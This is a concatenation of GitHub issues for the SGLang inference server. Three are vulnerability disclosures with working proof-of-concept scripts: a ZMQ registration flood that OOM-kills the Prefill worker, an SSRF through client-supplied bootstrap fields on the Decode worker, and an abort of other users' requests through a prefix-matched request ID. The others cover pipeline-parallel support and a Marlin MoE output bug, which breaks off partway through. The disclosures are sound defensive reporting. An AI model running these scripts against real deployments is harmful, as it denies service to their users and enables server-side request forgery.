- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

### Summary

SGLang 0.5.15.post1 accepts registration-shaped ZMQ messages from any peer that can reach a Prefill rank socket when the Mooncake PD backend is enabled. The sender is not authenticated or matched to a configured Decode worker. The receive path also has no per-message or table-wide resource limit. In a two-host test, an adjacent host queried the unauthenticated bootstrap route, sent unique fake sessions, exhausted a 16 GiB Prefill-only cgroup, caused the Prefill scheduler to be OOM-killed, and made routed completions unavailable until restart. The tested cross-host setup explicitly bound Prefill to `0.0.0.0`. We suggest Moderate severity with CVSS v3.1 `6.5 (AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)`.

### Details

`CommonKVManager.__init__()` creates a ZMQ `PULL` socket and stores its dynamic rank port. The Prefill bootstrap HTTP `/route` endpoint returns the rank IP and port. Neither step requires a protocol credential.

In `MooncakeKVManager.start_prefill_thread()`, the inner `bootstrap_thread()` receives each multipart message. A message with `room == "None"` is parsed as a Decode registration and stored under the sender-provided session ID:

```
waiting_req_bytes = self.server_socket.recv_multipart()
room = waiting_req_bytes[0].decode("ascii")
mooncake_session_id = waiting_req_bytes[3].decode("ascii")
if room == "None":
    self.decode_kv_args_table[mooncake_session_id] = (
        KVArgsRegisterInfo.from_zmq(waiting_req_bytes)
    )
    continue
```



`KVArgsRegisterInfo.from_zmq()` passes frame 6 to `unpack_int_lists()`. The first integer in that frame controls the number of nested buffers. A 400,004-byte nested-buffer frame can declare 100,000 empty child buffers. The parser materializes 100,000 Python lists before any peer check or size check. A unique session ID keeps each parsed object in `decode_kv_args_table`. This path has no sender authentication, Decode identity binding, nested-buffer limit, table size limit, or expiry for a fake registration.

The retention behavior was checked with a diagnostic observer only. Fifty messages contained 20,003,050 bytes of application-frame data. Prefill PSS increased by about 365 MB. All 50 entries and sampled 100,000-list objects remained present for about 600 seconds and after `gc.collect()`. Restarting Prefill cleared the state.

The request effect was first checked on five fresh stock 1P1D stacks with no diagnostic hook. A 30-request baseline had a 0.7711-second median. Each attack run sent 20 unique 100,000-buffer registrations. Every run had one real completion take 3.2168 to 3.9460 seconds, or 4.17 to 5.12 times the baseline median. Three no-attack controls and three 1,024-buffer controls had per-run maxima below 0.820 seconds.

The final availability test used victim `192.168.55.134` and adjacent host `192.168.55.88`. Prefill was the only component placed in a cgroup with `memory.max=17179869184` and `memory.swap.max=0`. Five requests immediately before the attack returned HTTP 200 with a 0.2334-second median. The adjacent host received HTTP 200 from the bootstrap `/route` endpoint without credentials and connected directly to the returned ZMQ rank port. Victim-side socket records showed the ZMQ peer as `192.168.55.88:58898 -> 192.168.55.134:44437`.

The client submitted 12,620 unique registrations containing 5,048,782,440 bytes of application-frame payload before the receiver failed and the client reached its send timeout. Prefill cgroup usage rose from about 3.72 GB to 16.69 GB in the last sample before the kill. All 12 post-attack memory samples were non-decreasing. The final cgroup snapshot recorded `memory.peak=17180061696`, `max=42`, `oom=1`, and `oom_kill=1`. The Prefill scheduler was absent after the kill while the launcher and detokenizer remained. Prefill `/health` timed out. Eleven monitored routed completions during the attack timed out, and five additional routed completions after the OOM and before restart also timed out. Router `/health` still returned HTTP 200, and the Router and Decode processes remained alive. After a clean stack restart, 5/5 completions succeeded.


### Reproduction

This was tested on Linux with SGLang 0.5.15.post1, sglang-router 0.3.2, mooncake-transfer-engine 0.3.11.post1, Python 3.12.13, pyzmq 27.1.0, PyTorch 2.11.0+cu130, Qwen3-8B, and two NVIDIA A100 80 GB GPUs. Use an isolated test network. Keep Prefill inside a memory-limited cgroup. The commands below use the ports from the two-host test.

On the victim, start Prefill in a separate terminal. Set `MODEL` to the local model path if needed:

```
MODEL=Qwen/Qwen3-8B
systemd-run --user --scope \
  --unit=sglang-c4-prefill \
  -p MemoryMax=16G \
  -p MemorySwapMax=0 \
  --setenv=CUDA_VISIBLE_DEVICES=0 \
  --setenv=SGLANG_DISAGG_STAGING_BUFFER=0 \
  python -m sglang.launch_server \
    --model-path "$MODEL" \
    --host 0.0.0.0 \
    --port 32400 \
    --tp-size 1 \
    --mem-fraction-static 0.50 \
    --disaggregation-mode prefill \
    --disaggregation-transfer-backend mooncake \
    --disaggregation-bootstrap-port 32498 \
    --engine-info-bootstrap-port 32489 \
    --served-model-name Qwen3-8B \
    --disable-cuda-graph
```



Start Decode and the PD router in two more victim terminals:

```
MODEL=Qwen/Qwen3-8B
CUDA_VISIBLE_DEVICES=1 python -m sglang.launch_server \
  --model-path "$MODEL" \
  --host 127.0.0.1 \
  --port 32401 \
  --tp-size 1 \
  --mem-fraction-static 0.50 \
  --disaggregation-mode decode \
  --disaggregation-transfer-backend mooncake \
  --engine-info-bootstrap-port 32490 \
  --served-model-name Qwen3-8B \
  --disable-cuda-graph
```



```
python -m sglang_router.launch_router \
  --pd-disaggregation \
  --prefill http://192.168.55.134:32400 32498 \
  --decode http://127.0.0.1:32401 \
  --host 0.0.0.0 \
  --port 32480 \
  --policy round_robin \
  --prometheus-host 127.0.0.1 \
  --prometheus-port 32491
```



Confirm that a normal request succeeds on the victim:

```
curl -sS -m 30 -H 'Content-Type: application/json' \
  -d '{"model":"Qwen3-8B","prompt":"baseline","max_tokens":8,"temperature":0}' \
  http://127.0.0.1:32480/v1/completions
```



Save the following as `repro_oom.py` on an adjacent host. It uses only the bootstrap HTTP route and the returned ZMQ endpoint. It does not use an API key, a Mooncake credential, or an SSH tunnel.

```
import json
import os
import struct
import time
import urllib.parse
import urllib.request
import uuid

import zmq

BOOTSTRAP = os.environ.get("BOOTSTRAP", "http://192.168.55.134:32498")
NESTED = 100_000
MAX_MESSAGES = 16_000


def rank_address():
    query = urllib.parse.urlencode(
        {
            "prefill_dp_rank": 0,
            "prefill_cp_rank": 0,
            "target_tp_rank": 0,
            "target_pp_rank": 0,
        }
    )
    with urllib.request.urlopen(f"{BOOTSTRAP}/route?{query}", timeout=5) as response:
        print(f"bootstrap_http={response.status}")
        info = json.loads(response.read())
    return info["rank_ip"], int(info["rank_port"])


def nested_buffers(count):
    return struct.pack(f"<{count + 1}I", count, *([0] * count))


def registration(session_id, nested):
    return [
        b"None",
        b"127.0.0.1",
        b"1",
        session_id.encode(),
        b"",
        b"",
        nested,
        b"0",
        b"1",
        b"1",
    ]


host, port = rank_address()
print(f"rank={host}:{port}")
nested = nested_buffers(NESTED)
context = zmq.Context()
socket = context.socket(zmq.PUSH)
socket.setsockopt(zmq.LINGER, 0)
socket.setsockopt(zmq.IMMEDIATE, 1)
socket.setsockopt(zmq.SNDTIMEO, 30_000)
socket.connect(f"tcp://{host}:{port}")

sent = 0
application_frame_bytes = 0
started = time.monotonic()
try:
    for _ in range(MAX_MESSAGES):
        message = registration(f"c4-{uuid.uuid4().hex}", nested)
        socket.send_multipart(message)
        sent += 1
        application_frame_bytes += sum(len(frame) for frame in message)
        if sent % 20 == 0:
            time.sleep(0.1)
except zmq.Again as error:
    print(f"send_stopped={error}")
finally:
    print(
        f"sent={sent} application_frame_bytes={application_frame_bytes} "
        f"elapsed={time.monotonic() - started:.3f}"
    )
    socket.close(0)
    context.term()
```



Run the trigger on the adjacent host:

```
BOOTSTRAP=http://192.168.55.134:32498 python3 repro_oom.py
```



While it runs, issue short-timeout completions on the victim. After the OOM event, test Prefill and the router before restarting anything:

```
curl -sS -m 3 -o /dev/null -w 'prefill_http=%{http_code} time=%{time_total}\n' \
  http://127.0.0.1:32400/health

for i in 1 2 3 4 5; do
  curl -sS -m 5 -H 'Content-Type: application/json' \
    -d '{"model":"Qwen3-8B","prompt":"post-oom","max_tokens":4,"temperature":0}' \
    -o /dev/null -w "request=$i http=%{http_code} time=%{time_total}\n" \
    http://127.0.0.1:32480/v1/completions
done
```



Read the cgroup counters with:

```
CGROUP=$(systemctl --user show -p ControlGroup --value sglang-c4-prefill.scope)
cat "/sys/fs/cgroup${CGROUP}/memory.events"
cat "/sys/fs/cgroup${CGROUP}/memory.peak"
```



The expected result is that untrusted registrations are rejected before nested metadata is materialized or retained. The observed result was `oom=1`, `oom_kill=1`, loss of the Prefill scheduler, Prefill health timeout, and 5/5 routed completion timeouts until the stack was restarted.

### Environment

SGLang 0.5.15.post1

items.title: [Feature] Allow DWDP with pipeline parallelism (`--pp-size > 1`)
items.body:
### Checklist

- [x] If this is not a feature request but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Motivation

`handle_dwdp` rejects pipeline parallelism:

https://github.com/sgl-project/sglang/blob/bb1d4cddd953597b4e27a8489367ddcbb99e3762/python/sglang/srt/arg_groups/parallel_hook.py#L437

The assert came in #29778 with the other DWDP guards. Unlike the EPLB and two-batch-overlap guards, its message gives no reason, and we found no discussion of PP in #29778 or #22084. Is there a case it is meant to catch?

We removed only this line and ran DWDP x PP prefill servers in a PD deployment. Accuracy holds, and among the layouts we tried on the same nodes, PP is the only one that cuts a long prompt's TTFT under DWDP. As far as we can tell, nothing in DWDP assumes a single stage:
- DWDP's group is the TP group, which under PP is one stage. `_collect_moe_layers` finds only the stage's own `FusedMoE` layers (the others are `PPMissingLayer`), so each stage shards its experts, exchanges its handles and allocates its prefetch slots over its own GPUs.
- The prefetch chain stays inside the stage: `prefetch_first_layers()` at the start of each forward, then two MoE layers ahead within the stage. No stage reads another stage's weights.
- Only activations cross stages. Attention TP is 1 under DWDP and the PP send/recv gathers over the attention-TP group, so rank i of one stage feeds rank i of the next, which serves the same DP rank.

A DWDP group shares its handles by POSIX fd or FABRIC handle, so it cannot leave one NVLink domain. On 8-GPU nodes, PP is therefore the way to span nodes with one DWDP prefill instance.

**Setup:** GLM-5.3-Flash (FP8), 8x H20 per node, PD with mooncake over RoCE, decode at TP8 on its own node. Prefill `--tp-size 8 --dwdp-size 8 --chunked-prefill-size 65536 --mm-enable-dp-encoder`, plus `--pp-size N --nnodes N` with one stage per node. Nightly image 2026-10-14 (684fea8a, whose DWDP files match `main`) with the assert removed and the shared-expert TP1 condition from #39802, which GLM needs under DWDP with or without PP.

Accuracy (GSM8K 20-shot, 200 questions; needle test, 16 prompts of ~50k tokens):

| Prefill | Nodes | GSM8K | Needle |
|---|---|---|---|
| DWDP8 | 1 | 0.965 | 12/16 |
| DWDP8 x PP2 | 2 | 0.955 | 15/16 |
| DWDP8 x PP3 | 3 | 0.955 | 15/16 |

Every needle miss answers that the text contains no code; the one-node setup scored 15/16 on the same prompts in another session. Without PD (`--disaggregation-mode null`), GSM8K is 0.950 for TP8 x PP2 and 0.955 for DWDP8 x PP2.

Speed, input tok/s through the router with 8 output tokens. Decode runs `--max-running-requests 256 --max-total-tokens 3276800` (448 slots for 2k), and the router and prefill balancer use round-robin, so only the prefill side limits the runs:

| Prefill | Nodes | 64k, 48 prompts at once | One 64k prompt at a time, TTFT | 2k, 1200 prompts at c384 |
|---|---|---|---|---|
| DWDP8 | 1 | 35.2k | 14.8 s | 36.9k |
| 2 x DWDP8 | 2 | 66.8k | 14.8 s | 70.2k |
| DWDP8 x PP2 | 2 | 62.7k | 8.8 s | 63.1k |
| TP8 x PP2 | 2 | 26.4k | 2.9 s | 37.7k |
| 3 x DWDP8 | 3 | 94.3k | 14.9 s | 96.2k |
| DWDP8 x PP3 | 3 | 87.7k | 6.6 s | 84.5k |

- Under attention DP one rank prefills each prompt, so separate instances serve a long prompt as slowly as one node does. PP pipelines its chunks over the stages: 14.8 -> 8.8 -> 6.6 s is 93-94% of a perfect pipeline.
- DWDP x PP keeps 93-94% (64k) and 88-90% (2k) of the throughput the same nodes give as separate instances.
- A request holds its prefill slot (and Mamba state, for hybrid models) across all stages, so PP needs more slots. The 2k column uses `--max-running-requests 256` on every prefill server (32 per DP rank); with the default 64 (at concurrency 192), PP3 reached only 41.0k, about what one node gave (35.5k).

Known gaps: a stage without MoE layers fails at startup in `DwdpManager.setup` ("no FusedMoE layers were found"), e.g. GLM-5.3-Flash split into ~15 stages. Not tested: FABRIC handles, other models, PP within one node, and DWDP + PP + MTP (#44763).

If the assert isn't guarding anything specific, we have a PR ready that removes it, with a `test_server_args.py` case and these numbers. We're also happy to run other configurations first.

cc @yhyang201 (added the assert in #29778) @yuhao318 (DWDP point of contact in #42473)

### Related resources

- #22084 tracks DWDP; #29778 added DWDP and this assert; #42473 is the Q4 roadmap.
- #44763 (DWDP + MTP) edits the speculative-decoding assert right above this one.

- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

### Summary

A caller that can reach an SGLang Decode worker's HTTP API in a Prefill/Decode disaggregation deployment can supply `bootstrap_host`, `bootstrap_port`, and `bootstrap_room` in an inference request. The Decode worker uses the supplied address in a synchronous HTTP request without checking that it belongs to a configured Prefill worker. This allows a direct Decode caller to make the worker contact an attacker-selected HTTP endpoint. A slow endpoint also blocks shared Decode request processing and delays unrelated inference requests.

The issue was reproduced on the official SGLang v0.5.17 image. A source snapshot of current main at commit `74c032234201aa0ed64b7a58c738d9ea393e319c` still contained the same sink on 2026-08-14, but current main was inspected only and was not tested at runtime. The official Gateway overwrote the three client-supplied fields in our control tests, so the confirmed attack surface is direct access to the Decode worker API. Suggested severity is Medium.

### Details

In `CommonKVManager.try_ensure_parallel_info()`, the Decode side treats the per-request bootstrap address as the authority for an HTTP URL:

```python
def try_ensure_parallel_info(self, bootstrap_addr: str) -> bool:
    if bootstrap_addr in self.prefill_info_table:
        return True

    try:
        url = (
            f"http://{bootstrap_addr}/route?"
            f"prefill_dp_rank={-1}&prefill_cp_rank={-1}&"
            f"target_tp_rank={-1}&target_pp_rank={-1}"
        )
        response = requests.get(url, timeout=5)
        ...
```

Runtime-tested v0.5.17 source:

- https://github.com/sgl-project/sglang/blob/29481685462732237d80d86076d6563e1f658102/python/sglang/srt/disaggregation/common/conn.py

Source-inspected main snapshot:

- https://github.com/sgl-project/sglang/blob/74c032234201aa0ed64b7a58c738d9ea393e319c/python/sglang/srt/disaggregation/common/conn.py
- https://github.com/sgl-project/sglang/blob/74c032234201aa0ed64b7a58c738d9ea393e319c/sgl-model-gateway/src/routers/http/pd_router.rs

The official v0.5.17 test used one Prefill worker, one Decode worker, one Gateway, Mooncake TCP, Qwen3-0.6B, and loopback-only endpoints. A direct Decode request selected a local canary port. The canary received 15 requests with this path:

```text
/route?prefill_dp_rank=-1&prefill_cp_rank=-1&target_tp_rank=-1&target_pp_rank=-1
```

The direct request returned HTTP 500 after 14.057 seconds. The same stock-code run selected four separate canary ports and reached all four. Two further clean restarts each produced 15 canary hits and an HTTP 500 response after about 30.10 seconds when the canary delayed each response by two seconds.

We then repeated the latency comparison in three distinct Decode container lifecycles. These repeats used logging-only instrumentation; the measured request times and canary hits came from external clients and canary servers. In each lifecycle, one direct Decode request targeted a canary that delayed every response by two seconds. Three normal Gateway requests started about 50 ms later. Their mean latency was 20.357, 20.350, and 20.356 seconds. In matched zero-delay runs, the corresponding means were 0.245, 0.246, and 0.245 seconds. The overall means were 20.354 and 0.246 seconds, an 82.88-fold difference. All nine normal requests returned HTTP 200, so the confirmed effect is severe latency increase rather than request failure.

As a negative control, a request carrying the same attacker-selected bootstrap fields was sent through the official Gateway in each lifecycle. All three Gateway requests returned HTTP 200 and the attacker canary received zero requests. This matches `inject_bootstrap_into_value()`, which overwrites the client values with the selected Prefill worker's server-side values.

The Decode worker should not trust bootstrap routing data supplied by an inference client. It should derive the Prefill endpoint from authenticated server-side topology and bind it to the selected worker or request. If direct worker APIs must accept this metadata, they should authenticate the internal caller and validate the address against the configured Prefill set. The parallel-info fetch should also avoid synchronously blocking shared request processing.

### Reproduction

Run the following only in an isolated loopback SGLang v0.5.17 Prefill/Decode test deployment that you own. The script refuses non-loopback URLs and requires an explicit confirmation flag. With `--delay-s 0`, it demonstrates the server-side request. With `--delay-s 2` and `--gateway-url`, it also measures concurrent normal requests.

```python
#!/usr/bin/env python3
import argparse
import ipaddress
import json
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


def loopback_url(value):
    parsed = urllib.parse.urlparse(value)
    if parsed.scheme != "http" or not parsed.hostname or parsed.port is None:
        raise argparse.ArgumentTypeError("use http://127.0.0.1:PORT")
    try:
        address = ipaddress.ip_address(parsed.hostname)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("use a literal loopback IP") from exc
    if not address.is_loopback:
        raise argparse.ArgumentTypeError("only loopback targets are accepted")
    return value.rstrip("/")


def post(url, body, timeout=45):
    started = time.monotonic()
    request = urllib.request.Request(
        url,
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            response.read()
            return {"status": response.status, "elapsed": time.monotonic() - started}
    except urllib.error.HTTPError as exc:
        exc.read()
        return {"status": exc.code, "elapsed": time.monotonic() - started}
    except Exception as exc:
        return {
            "status": -1,
            "elapsed": time.monotonic() - started,
            "error": f"{type(exc).__name__}: {exc}",
        }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--decode-url", type=loopback_url, required=True)
    parser.add_argument("--gateway-url", type=loopback_url)
    parser.add_argument("--model", default="/models/Qwen3-0.6B")
    parser.add_argument("--canary-port", type=int, default=39080)
    parser.add_argument("--delay-s", type=float, default=0)
    parser.add_argument("--confirm-isolated-lab", action="store_true")
    args = parser.parse_args()
    if not args.confirm_isolated_lab:
        parser.error("add --confirm-isolated-lab")
    if not 1024 <= args.canary_port <= 65535 or not 0 <= args.delay_s <= 2:
        parser.error("invalid canary port or delay (allowed delay: 0..2 seconds)")

    hits = []
    lock = threading.Lock()

    class Canary(BaseHTTPRequestHandler):
        def do_GET(self):
            with lock:
                hits.append({"time": time.time(), "path": self.path})
            time.sleep(args.delay_s)
            body = b'{"canary":true}'
            self.send_response(503)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            try:
                self.wfile.write(body)
            except BrokenPipeError:
                pass

        def log_message(self, *unused):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", args.canary_port), Canary)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    base = {
        "model": args.model,
        "messages": [{"role": "user", "content": "reply OK"}],
        "max_tokens": 8,
        "temperature": 0,
    }
    malicious = dict(base)
    malicious.update(
        bootstrap_host="127.0.0.1",
        bootstrap_port=args.canary_port,
        bootstrap_room=time.time_ns() & ((1 << 62) - 1),
    )

    results = {}
    attack = threading.Thread(
        target=lambda: results.update(
            attack=post(args.decode_url + "/v1/chat/completions", malicious)
        )
    )
    attack.start()
    time.sleep(0.05)

    normal_threads = []
    if args.gateway_url:
        for index in range(3):
            thread = threading.Thread(
                target=lambda i=index: results.update(
                    {f"normal_{i}": post(args.gateway_url + "/v1/chat/completions", base)}
                )
            )
            thread.start()
            normal_threads.append(thread)

    for thread in normal_threads:
        thread.join()
    attack.join()
    server.shutdown()
    server.server_close()
    results["canary_hits"] = hits
    print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
```

Example SSRF check:

```bash
python3 poc.py \
  --decode-url http://127.0.0.1:30001 \
  --delay-s 0 \
  --confirm-isolated-lab
```

Example matched blocking check:

```bash
python3 poc.py \
  --decode-url http://127.0.0.1:30001 \
  --gateway-url http://127.0.0.1:8000 \
  --delay-s 2 \
  --confirm-isolated-lab
```

On the affected configuration, the canary receives repeated `/route?...` requests selected by the direct client. The zero-delay direct request fails after about 14 seconds. A two-second canary delay makes the direct request take about 30 seconds and can increase concurrent normal request latency to about 20 seconds. Exact latency depends on hardware and model warm-up.

### Environment

- SGLang `v0.5.17` official image (runtime-tested; tested source at commit `29481685462732237d80d86076d6563e1f658102`)
- Topology: one Prefill worker, one Decode worker, one Gateway (`sgl-model-gateway`), Mooncake TCP transfer backend, model `Qwen3-0.6B`, all endpoints loopback-only
- Decode API at `127.0.0.1:30001`, Gateway at `127.0.0.1:8000`; no API key configured on the tested worker

items.title: [Bug] Client-controlled RID prefix allows cross-request abort through disconnect cleanup
items.body:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

> **Disclosure note:** This issue was first reported privately through GitHub Security Advisories on **August 2, 2026** as **GHSA-c7p3-8wqm-7cq3**. The private report has never been processed since then, so we are now disclosing it publicly. Public issue #41474 (opened September 27, 2026) and the unmerged fix PRs #41481 / #41502 / #43476 later described the same root cause.

SGLang accepts a client-controlled request ID (`rid`) on the normal streaming generation API. When that client disconnects, delayed cleanup sends an abort for the supplied ID. `Scheduler.abort_request()` treats that ID as a prefix and cancels every active request whose ID starts with it. A remote API client can use a short `rid` to abort unrelated concurrent requests, including requests with default UUID IDs. We reproduced this on stock SGLang 0.5.15.post1 in both a single-worker server and a 1-prefill/1-decode deployment behind sglang-router 0.3.2. The same code path is present in SGLang 0.5.16. The suggested severity is High because an unauthenticated client on a default exposed API can repeatedly deny generation service to other clients.

`GenerateReqInput._normalize_single_inputs()` creates a UUID only when `rid` is `None`, so a supplied value is preserved:

```python
if self.rid is None:
    self.rid = uuid.uuid4().hex
```

Tested source: https://github.com/sgl-project/sglang/blob/0b3bb0cbe31873994c9f989fddfe2f87ca839fdd/python/sglang/srt/managers/io_struct.py#L427-L431

For a streaming response, `TokenizerManager.create_abort_task()` installs a background task. The task sleeps for two seconds and then calls `abort_request(obj.rid)`. `TokenizerManager.abort_request()` checks whether that exact ID is still present in `rid_to_state` before dispatching `AbortReq`. A long attacker request remains active on the server after its client closes the stream, so this check passes.

```python
async def abort_request():
    await asyncio.sleep(2)
    if obj.is_single:
        self.abort_request(obj.rid)
```

Tested source: https://github.com/sgl-project/sglang/blob/0b3bb0cbe31873994c9f989fddfe2f87ca839fdd/python/sglang/srt/managers/tokenizer_manager.py#L1677-L1689 and https://github.com/sgl-project/sglang/blob/0b3bb0cbe31873994c9f989fddfe2f87ca839fdd/python/sglang/srt/managers/tokenizer_manager.py#L1808-L1818

`Scheduler.abort_request()` then applies the abort with `req.rid.startswith(recv_req.rid)` instead of exact equality. The prefix match is used for chunked, waiting, grammar, PD prefill, PD decode, and running requests. A cleanup request for `rid="a"` can therefore abort a different request such as `rid="a-victim"`.

```python
for req in inflight_reqs:
    if not req.finished() and (
        recv_req.abort_all or req.rid.startswith(recv_req.rid)
    ):
        req.to_finish = FINISH_ABORT()
```

Tested source: https://github.com/sgl-project/sglang/blob/0b3bb0cbe31873994c9f989fddfe2f87ca839fdd/python/sglang/srt/managers/scheduler.py#L3877-L3987

The latest release inspected, SGLang 0.5.16 at commit `fdebc938f7f4d16fe6b9f55dcd9a767cf0899ea1`, still contains the eight prefix comparisons, the exact state gate, and the delayed cleanup path: https://github.com/sgl-project/sglang/blob/fdebc938f7f4d16fe6b9f55dcd9a767cf0899ea1/python/sglang/srt/managers/scheduler.py#L4029-L4156, https://github.com/sgl-project/sglang/blob/fdebc938f7f4d16fe6b9f55dcd9a767cf0899ea1/python/sglang/srt/managers/tokenizer_manager.py#L1711-L1724, and https://github.com/sgl-project/sglang/blob/fdebc938f7f4d16fe6b9f55dcd9a767cf0899ea1/python/sglang/srt/managers/tokenizer_manager.py#L1845-L1854

Replacing the request-specific prefix comparisons with exact equality stopped the cross-request abort in 5/5 single-worker trials and 5/5 PD trials after all worker processes were reloaded. A fix should use exact request identity for ordinary aborts and keep any intentional bulk-abort operation separate and explicitly authorized. Server-generated or server-namespaced request IDs would provide additional isolation.

### Reproduction

The runtime test used SGLang 0.5.15.post1, Python 3.12.13, Linux 6.8, and Qwen3-8B. The PD test used sglang-router 0.3.2 with one prefill worker, one decode worker, and the Mooncake transfer backend. The minimal PoC below uses only the standard Python library. Run it only against an isolated server that you own.

Start a stock single-worker server:

```bash
python -m sglang.launch_server \
  --model-path Qwen/Qwen3-8B \
  --host 127.0.0.1 \
  --port 30000 \
  --tp-size 1 \
  --context-length 4096 \
  --disable-cuda-graph
```

Save and run this script while the server is idle except for the two PoC requests:

```python
#!/usr/bin/env python3
import json
import secrets
import threading
import time
import urllib.request

BASE = "http://127.0.0.1:30000"
TOKENS = 1024


def payload(text, rid):
    return json.dumps({
        "text": text,
        "rid": rid,
        "stream": True,
        "sampling_params": {
            "max_new_tokens": TOKENS,
            "temperature": 0,
            "ignore_eos": True,
        },
    }).encode()


def stream(rid, text, first_event=None, disconnect=False):
    result = {"first": None, "disconnect": None, "finish": None,
              "finish_reason": None, "observed_id": None}
    request = urllib.request.Request(
        BASE + "/generate",
        data=payload(text, rid),
        headers={"Content-Type": "application/json", "Accept": "text/event-stream"},
        method="POST",
    )
    response = urllib.request.urlopen(request, timeout=60)
    for raw_line in response:
        line = raw_line.strip()
        if not line.startswith(b"data:"):
            continue
        encoded = line[5:].strip()
        if encoded == b"[DONE]":
            result["finish"] = time.monotonic()
            break
        event = json.loads(encoded)
        meta = event.get("meta_info") or {}
        result["observed_id"] = meta.get("id", result["observed_id"])
        if meta.get("finish_reason") is not None:
            result["finish_reason"] = meta["finish_reason"]
        if result["first"] is None and event.get("text"):
            result["first"] = time.monotonic()
            if first_event:
                first_event.set()
            if disconnect:
                result["disconnect"] = time.monotonic()
                response.close()
                return result
    result["finish"] = result["finish"] or time.monotonic()
    return result


prefix = "poc" + secrets.token_hex(4)
victim_rid = prefix + "-victim-" + secrets.token_hex(3)
victim_first = threading.Event()
victim_box = {}


def run_victim():
    victim_box["result"] = stream(
        victim_rid,
        "Write a long detailed textbook chapter. Continue without stopping.",
        first_event=victim_first,
    )


thread = threading.Thread(target=run_victim, daemon=True)
thread.start()
assert victim_first.wait(30), "victim did not produce a first token"
time.sleep(0.3)
attacker = stream(
    prefix,
    "Count slowly from 1 to 10000 with explanations.",
    disconnect=True,
)
thread.join(60)
victim = victim_box["result"]
delta = victim["finish"] - attacker["disconnect"]
print(json.dumps({
    "victim_rid": victim_rid,
    "attacker_rid": prefix,
    "prefix_relation": victim_rid.startswith(prefix),
    "victim_finish_reason": victim["finish_reason"],
    "disconnect_to_victim_finish_seconds": round(delta, 3),
    "victim_observed_id": victim["observed_id"],
    "attacker_observed_id": attacker["observed_id"],
}, indent=2))
```

On an affected server, the victim finishes with `{"type":"abort","message":"Aborted"}` about two seconds after the attacker stream is closed. The expected safe result is that only the attacker request is cleaned up and the victim reaches its normal length finish.

The corrected test matrix produced these results:

| Topology and condition | Valid trials | Victim aborts |
| --- | ---: | ---: |
| Stock single worker, prefix attacker disconnect | 5 | 5 |
| Stock single worker, non-prefix attacker disconnect | 5 | 0 |
| Stock single worker, prefix attacker completes normally | 5 | 0 |
| Exact-equality control, single worker | 5 | 0 |
| Stock 1P1D router, prefix attacker disconnect | 5 | 5 |
| Stock 1P1D router, non-prefix attacker disconnect | 5 | 0 |
| Stock 1P1D router, prefix attacker completes normally | 5 | 0 |
| Exact-equality control, 1P1D with workers reloaded | 5 | 0 |

The mean disconnect-to-abort time was 2.037 seconds on the single worker and 2.060 seconds through the 1P1D router. All health checks stayed successful. In a separate stock 1P1D test, eight concurrent victims omitted `rid` and received default 32-character hexadecimal IDs. Disconnecting one long attacker for each one-character prefix `0` through `f` aborted all eight victims in each of five independent rounds, for 40/40 victim aborts. Each victim abort occurred 2.030 to 2.055 seconds after its matching prefix attacker disconnected.

### Environment

- SGLang `0.5.15.post1` (runtime test); the same code path is also present in `0.5.16` (commit `fdebc938f7f4d16fe6b9f55dcd9a767cf0899ea1`) and in the public issue's version `0.5.19`
- Python 3.12.13, Linux 6.8, Ubuntu 22.04
- Model: `Qwen/Qwen3-8B`, launched with `--tp-size 1 --context-length 4096 --disable-cuda-graph`
- Single-worker test: `python -m sglang.launch_server` on `127.0.0.1:30000`
- PD test: sglang-router `0.3.2`, one prefill worker + one decode worker, Mooncake transfer backend
- Hardware: 2× NVIDIA A100 80 GB

items.title: [Bug] Marlin MoE (AWQ W4A16) on SM86 intermittently returns wrong expert outputs, even for a single request; the Triton WNA16 kernel is exact
items.body:
## Summary
On an RTX 3090, SGLang 0.5.22 runs an AWQ (4-bit, group 128) MoE checkpoint through the Marlin MoE kernel
(`moe_wna16_marlin`). In most runs of a 192-request workload, 1–18 requests produce wrong tokens from some
decode step on. With batching, many unrelated requests often go wrong at the **same** step; with one request
at a time, requests still go wrong on their own. It is nondeterministic: rerunning the same workload gives different requests and
steps, and some runs are clean.

The checkpoint's weights are exactly representable in AWQ and every output token is known in advance (see
below), so these are not numerical differences:
- the same checkpoint is exact with `--quantization moe_wna16` (the Triton WNA16 MoE kernel);
- vLLM 0.31.0 is exact on it, through its own Marlin MoE;
- the bf16 checkpoint it was quantized from is exact.

## Observed (probec probe twin, Qwen3-30B-A3B shape at 2 layers, 128 experts, top-8; greedy; 192 requests x 256 tokens)
| SGLang 0.5.22, RTX 3090 | requests wrong per run |
|---|---|
| default (FlashInfer attention, radix cache, overlap scheduler, CUDA graphs) | 1 (on another host), 5, 17 |
| `--disable-radix-cache` | 1 |
| `--disable-overlap-schedule` | 2 |
| `--disable-cuda-graph` | 1 |
| `--mem-fraction-static 0.5` (half the KV pool) | 18, 0 |
| `--max-running-requests 1` (no batching: one request at a time) | **11** |
| `--quantization moe_wna16` (Triton WNA16 MoE kernel) | **0, 0** |
| the bf16 checkpoint (control), mem fraction 0.8 and 0.9 | 0, 0, 0 |
| vLLM 0.31.0 (Marlin MoE), same AWQ checkpoint | 0, 0, 0 |

**One request, alone, repeated:** with `max_running_requests=1`, the same 1,500-token request was run 24 times
in one engine, for each of 4 prompts. Each prompt gave 3–6 distinct outputs, and 2–5 of its 24 repeats were
